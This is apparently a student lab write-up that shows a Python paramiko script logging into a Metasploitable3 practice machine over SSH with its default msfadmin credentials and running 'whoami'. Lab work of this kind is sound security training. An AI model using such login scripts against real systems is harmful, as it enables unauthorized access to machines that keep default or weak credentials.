# Custom Script – SSH Login with Python

This part shows how we created a simple Python script to log into Metasploitable3 over SSH using default credentials.

## Target Info

- IP Address: 172.28.128.3
- Port: 22
- Username: msfadmin
- Password: msfadmin

## What We Did

We wrote a basic script using Python and the paramiko library. It connects to the target’s SSH service, logs in with the credentials, and runs the command `whoami` to confirm access.

## The Script (ssh_brute.py)

```python
import paramiko

target_ip = "172.28.128.3"
username = "msfadmin"
password = "msfadmin"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    print(f"[+] Trying {username}:{password}")
    client.connect(target_ip, username=username, password=password, timeout=5)
    print("[+] Login successful!")

    stdin, stdout, stderr = client.exec_command("whoami")
    print("[+] Command output:", stdout.read().decode())

    client.close()
except paramiko.AuthenticationException:
    print("[-] Login failed.")
```

## How We Ran It

We saved the script as `ssh_brute.py` inside Kali and ran it using:

```bash
python3 ssh_brute.py
```

Before running it, we installed paramiko with:

```bash
sudo apt install python3-paramiko
```

## Result

The script logged in successfully and showed that the current user was `msfadmin`.

## Screenshot

We took a screenshot showing the terminal output after running the script.  
The file is saved as: `custom_script_attack.png`

This completes Task 1.2 for Phase 1.
